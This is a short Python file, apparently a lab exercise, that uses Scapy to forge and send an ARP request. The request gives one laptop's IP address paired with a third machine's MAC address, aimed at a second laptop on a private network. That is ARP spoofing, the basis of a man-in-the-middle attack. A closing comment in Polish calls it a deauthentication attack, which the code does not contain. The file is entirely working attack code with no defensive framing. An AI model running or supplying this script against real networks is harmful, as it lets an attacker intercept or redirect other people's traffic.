from scapy.all import *


laptop1_ip = "172.20.10.7"  
laptop2_ip = "172.20.10.6"  
laptop3_mac = "5e:ac:aa:4b:ac:03" 


arp_request = ARP(op=1,
                  pdst=laptop2_ip,  
                  psrc=laptop1_ip,  
                  hwdst="ff:ff:ff:ff:ff:ff", 
                  hwsrc=laptop3_mac)

send(arp_request)


# atak deauthentykacji 